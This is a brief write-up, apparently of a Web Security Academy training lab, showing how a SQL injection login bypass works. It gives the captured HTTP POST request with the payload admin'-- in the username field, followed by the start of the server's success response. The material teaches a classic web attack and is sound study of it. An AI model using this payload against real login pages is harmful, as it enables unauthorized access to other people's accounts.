# SQL injection vulnerability allowing login bypass

### In the login page in username types `admin` and in password a random `1234` then clicked on login and captured request in burp and in the bottom of the request added `'--` beside admin so that after it every thing gets neglected
**Request**

```http
POST /login HTTP/2
Host: 0a07000f04da85a880574e7300270035.web-security-academy.net
Cookie: session=[REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: https://0a07000f04da85a880574e7300270035.web-security-academy.net
Referer: https://0a07000f04da85a880574e7300270035.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=X5fi8XdWPTfJEdTLVBNfgdplZcpAWRjo&username=admin'--&password=1234
```

**Response**

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3331

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>SQL injection vulnerability allowing login bypass</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo>
                    [...remaining response omitted...]
```
